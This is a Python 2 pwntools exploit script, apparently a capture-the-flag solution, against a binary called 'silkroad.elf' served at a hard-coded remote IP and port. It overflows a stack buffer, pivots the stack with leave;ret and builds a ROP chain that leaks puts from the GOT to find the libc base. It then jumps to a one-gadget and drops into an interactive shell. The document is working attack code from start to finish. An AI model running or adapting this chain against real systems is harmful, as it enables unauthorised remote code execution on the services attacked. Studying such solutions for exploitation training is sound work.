#!/usr/bin/env python2
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
elf = ELF('./silkroad.elf')
libc = ELF('./libc.so.6')
#r = remote('localhost', 4000)
r = remote('82.196.10.106', 58399)

r.sendlineafter('ID: ', '790317143')
print len('DreadPirateRoberts\x00iz\x00')
r.sendafter('nick: ', 'DreadPirateRobertssiz\x00')

pop_rdi = 0x401bab
pop_rsi_r15 = 0x401ba9
pop_r12_r13_r14_r15 = 0x401ba4

# 0x0000000000401b88 : mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword ptr [r12 + rbx*8]
call_r12 = 0x401b88
buf = 0x404d00
leave_ret = 0x401298
ret = 0x4011af

r.sendlineafter('!\n', 'A'*64 + p64(buf-8) + flat(
    pop_rdi,
    0,
    pop_rsi_r15,
    buf,
    0,
    elf.plt['read'],
    leave_ret
))

payload = flat(
    pop_r12_r13_r14_r15,
    elf.got['read'],
    0,
    buf + 0x28,
    1000,
    call_r12
)

payload2 = flat(
    pop_rdi,
    elf.got['puts'],
    elf.plt['puts'],

    pop_rdi,
    0,
    pop_rsi_r15,
    buf+0x70,
    0,
    elf.plt['read'],
)

r.send(payload)
raw_input()
r.send(payload2)
leak = u64(r.recvn(6).ljust(8,'\x00'))
base = leak - libc.symbols['puts']
magic = base + 0x10a38c
print hex(magic)
raw_input()
r.send(p64(magic))

r.interactive()
